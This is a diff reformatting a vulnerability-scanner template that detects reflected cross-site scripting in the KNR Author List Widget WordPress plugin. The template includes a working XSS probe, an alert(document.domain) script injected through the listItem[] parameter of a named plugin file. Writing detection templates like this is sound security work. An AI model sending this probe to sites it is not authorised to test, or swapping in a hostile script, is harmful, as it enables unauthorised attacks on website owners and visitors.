@@ -1,5 +1,4 @@
 id: knr-widget-xss
-
 info:
   name: KNR Author List Widget - Cross-site Scripting
   author: theamanrawat
@@ -11,32 +10,27 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 6.1
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
-    verified: true
     max-request: 1
-  tags: xss,knr-author-list-widget,wordpress,wp,wp-plugin,vuln
-
+    verified: true
+  tags: knr-author-list-widget,vuln,wordpress,wp,wp-plugin,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
           - 'item: <script>alert(document.domain)</script>'
-          - 'Saved on'
-        condition: and
-
-      - type: word
-        part: header
+          - Saved on
+      - part: header
+        type: word
         words:
-          - 'text/html'
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>'
